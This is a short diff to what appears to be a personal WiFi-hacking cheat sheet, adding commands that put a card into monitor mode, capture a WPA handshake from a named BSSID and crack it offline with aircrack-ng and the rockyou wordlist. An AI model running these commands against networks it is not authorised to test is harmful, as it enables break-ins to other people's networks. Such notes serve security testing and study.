@@ -132,6 +132,21 @@ wpapcap2john bettercap-wifi-handshakes.pcap
 
 https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/
 
+*avec aircrack*
+
+https://www.aircrack-ng.org/doku.php?id=cracking_wpa
+
+```bash
+sudo su
+airmon-ng start wlan0 #set monitor & rename wlan0 (wlan0mon)
+airodump-ng wlan0mon #scan network
+airodump-ng --bssid 68:A3:78:01:C9:EF -w psk wlan0mon #find bssid (last command)
+airodump-ng stop wlan0mon #set back monitor->managed
+
+#offline
+aircrack-ng -w rockyou.txt -b 68:A3:78:01:C9:EF psk-01.*cap
+```
+
 ## WPA - EAP
 
 ```bash
